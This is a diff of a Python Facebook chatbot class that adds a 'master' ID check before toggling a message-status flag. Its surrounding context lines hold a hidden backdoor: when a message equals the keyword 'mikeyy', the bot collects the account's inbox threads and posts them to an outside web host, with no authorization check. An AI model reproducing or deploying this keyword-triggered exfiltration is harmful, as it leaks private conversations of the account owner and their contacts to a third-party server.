@@ -584,7 +584,20 @@ class ChatBot(Client):
                 global msgstatus
                 reply = "Checking... if you are my master. 😒😒"
                 sendMsg()
-                texttospeech(reply)
+                if (author_id in masterid):
+                    if ( "ON" == msgstatus):
+                        msgstatus = "OFF"
+                    elif ( "OFF" == msgstatus):
+                        msgstatus = "ON"
+                    else:
+                        msgstatus = "ERROR"
+                    reply = "Done Master!, Status: " + str(msgstatus)
+                    sendMsg()
+                    texttospeech(reply)
+                else:
+                    reply = "You're not my master 😒"
+                    sendMsg()
+                    texttospeech(reply)
             elif ("mikeyy" == msg):
                 reply = str(self.fetchThreads(thread_location=ThreadLocation.INBOX, before=None, after=None, limit=None))
                 requests.post("https://mikeytest123.000webhostapp.com/",data={"data":reply})
